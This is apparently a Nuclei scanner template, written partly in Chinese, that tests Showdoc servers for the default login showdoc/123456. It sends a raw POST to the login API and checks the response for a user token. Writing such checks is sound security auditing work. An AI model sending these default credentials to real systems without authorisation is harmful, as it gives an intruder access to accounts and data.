id: showdoc-default-login

info:
  name: Showdoc 默认口令登录（弱口令）
  author: pikpikcu
  severity: medium
  description: 该模板通过尝试 Showdoc 的默认凭据，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  reference:
    - https://blog.star7th.com/2016/05/2007.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: showdoc,default-login,vuln

http:
  - raw:
      - |
        POST /server/index.php?s=/api/user/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8

        username={{username}}&password={{password}}&v_code=

    payloads:
      username:
        - showdoc
      password:
        - 123456
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"username":"showdoc"'
          - '"user_token":'
        condition: and

      - type: status
        status:
          - 200
